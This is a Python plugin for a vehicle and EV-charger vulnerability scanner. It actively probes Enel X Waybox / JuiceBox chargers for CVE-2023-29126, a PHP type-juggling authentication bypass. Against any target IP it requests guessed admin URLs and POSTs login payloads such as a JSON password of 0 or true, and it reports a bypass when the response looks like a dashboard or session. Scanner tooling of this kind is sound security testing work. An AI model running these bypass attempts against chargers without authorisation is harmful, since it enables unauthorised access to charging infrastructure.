#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
import json
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 59,
    "cve": "CVE-2023-29126",
    "year": 2023,
    "domain": "IVI/云端/EVSE/OS",
    "vendor_product": "Enel X Waybox EV charger",
    "component": "PHP web management",
    "type": "PHP类型混淆/认证绕过",
    "summary": "PHP类型混淆可在特定条件下绕过认证。",
    "source_description": "The Waybox Enel X web management application contains a PHP-type juggling vulnerability that may allow a brute force process and under certain conditions bypass authentication.",
    "poc_status": "公开公告；大多未见一步式PoC",
    "research_value": "作为近两年前后演进基线，对比2024-2026风险变化。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29126",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-29126",
        "https://support-emobility.enelx.com/content/dam/enelxmobility/italia/documenti/manuali-schede-tecniche/Waybox-3-Security-Bulletin-06-2024-V1.pdf",
        "https://cveawg.mitre.org/api/cve/CVE-2023-29126"
    ],
    "affected": [
        {
            "vendor": "Enel X",
            "product": "JuiceBox Pro 3.0 22kW Cellular",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThanOrEqual": "2.1.1.0_JB3VU096A",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-29126",
        "Enel",
        "Waybox",
        "charger",
        "PHP",
        "web",
        "management",
        "application",
        "contains",
        "PHP-type",
        "juggling",
        "vulnerability",
        "allow",
        "brute",
        "force",
        "process",
        "under",
        "certain",
        "conditions",
        "bypass",
        "authentication",
        "Enel X",
        "JuiceBox Pro 3.0 22kW Cellular"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2023-29126: Enel Waybox PHP type juggling auth bypass with multiple vectors."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2023-29126",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - Enel Waybox PHP type juggling auth bypass",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    r_root = probe.get("/")
    body_root = r_root.get("body_text", "")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")
    if any(kw in body_root.lower() for kw in ["php", "waybox", "enel", "juicebox"]):
        evidence["php_app_detected"] = True

    php_bypass_paths = ["/index.php?page=admin", "/index.php?auth_bypass=1",
                        "/admin.php", "/management.php"]
    for path in php_bypass_paths:
        r = probe.get(path)
        status = r.get("status")
        evidence[f"php_bypass_{path.split('?')[0].strip('/').replace('/', '_')}_status"] = status
        if status == 200:
            body = r.get("body_text", "")
            if any(kw in body.lower() for kw in ["dashboard", "admin", "config", "settings"]):
                evidence["php_bypass_success"] = path
                evidence["bypass_body"] = body[:300]
                return {
                    "vulnerable": True,
                    "evidence": evidence,
                    "detection_confidence": detection_confidence("B", evidence, "php_bypass_confirmed"),
                    "requires_manual_review": False,
                }

    type_confusion_payloads = [
        json.dumps({"password": 0}).encode(),
        json.dumps({"password": True}).encode(),
        json.dumps({"password": 0, "username": "admin"}).encode(),
    ]
    login_paths = ["/login", "/api/login", "/login.php", "/auth"]
    for path in login_paths:
        for payload in type_confusion_payloads:
            r = probe.post(path, payload, "application/json")
            status = r.get("status")
            evidence[f"type_juggling_{path.strip('/').replace('/', '_')}_status"] = status
            if status == 200:
                body = r.get("body_text", "")
                evidence["type_juggling_response"] = body[:300]
                if any(kw in body.lower() for kw in ["token", "session", "success", "welcome"]):
                    evidence["possible_auth_bypass"] = True
                    return {
                        "vulnerable": True,
                        "evidence": evidence,
                        "detection_confidence": detection_confidence("B", evidence, "php_type_juggling_bypass"),
                        "requires_manual_review": False,
                    }

    evidence["php_bypass_paths_tested"] = php_bypass_paths
    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("B", evidence, "php_bypass_probed"),
        "requires_manual_review": True,
    }

class Poc51CVE202329126AuthBypassAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-059'
    meta_poc_name = 'CVE-2023-29126 认证绕过 Active Validation'
    meta_cve_id = 'CVE-2023-29126'
    meta_severity = 'Medium'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-29126'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-29126']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "51_Enel_Waybox_PHP_Auth_Bypass_Audit") if "VULN" in dir() else "51_Enel_Waybox_PHP_Auth_Bypass_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc51CVE202329126AuthBypassAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
